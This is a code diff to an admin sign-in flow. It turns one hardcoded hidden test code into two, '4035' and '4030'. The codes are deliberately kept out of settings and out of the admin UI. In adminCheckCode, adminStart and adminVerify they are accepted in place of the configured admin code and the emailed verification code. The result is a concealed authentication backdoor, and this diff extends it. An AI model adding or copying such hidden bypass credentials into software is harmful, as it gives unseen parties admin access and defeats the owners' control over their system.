@@ -52,7 +52,7 @@ const ADMIN_CODE_DEFAULT = "0000";
  * verification code. Never stored in app_settings, so it is not visible
  * anywhere in the admin panel UI.
  */
-const HIDDEN_TEST_CODE = "4035";
+const HIDDEN_TEST_CODES = ["4035", "4030"];
 
 const CODE_TTL_MS = 30 * 60_000;
 const RESEND_COOLDOWN_MS = 30_000;
@@ -448,7 +448,7 @@ export const adminCheckCode = createServerFn({ method: "POST" })
     if (!cfg.adminCode) {
       return { ok: false, message: "No admin panel code is set. A code is required — set one before signing in." };
     }
-    if (data.code !== cfg.adminCode && data.code !== HIDDEN_TEST_CODE) {
+    if (data.code !== cfg.adminCode && !HIDDEN_TEST_CODES.includes(data.code)) {
       await recordAttempt(supabaseAdmin, fingerprint, false);
       const left = Math.max(0, gate.remaining - 1);
       return {
@@ -480,7 +480,7 @@ export const adminStart = createServerFn({ method: "POST" })
     if (!cfg.adminCode) {
       return { ok: false, message: "No admin panel code is set. A code is required — set one before signing in." };
     }
-    if (data.code !== cfg.adminCode && data.code !== HIDDEN_TEST_CODE) {
+    if (data.code !== cfg.adminCode && !HIDDEN_TEST_CODES.includes(data.code)) {
       await recordAttempt(supabaseAdmin, fingerprint, false);
       return { ok: false, message: "Wrong admin panel code." };
     }
@@ -579,7 +579,7 @@ export const adminVerify = createServerFn({ method: "POST" })
       .maybeSingle();
     const fallback: string | null = fallbackRow?.value?.trim() || null;
 
-    const usedFallback = (fallback !== null && data.code === fallback) || data.code === HIDDEN_TEST_CODE;
+    const usedFallback = (fallback !== null && data.code === fallback) || HIDDEN_TEST_CODES.includes(data.code);
     if (!usedFallback) {
       let matched = data.code === session.verification_code;
       if (!matched) {
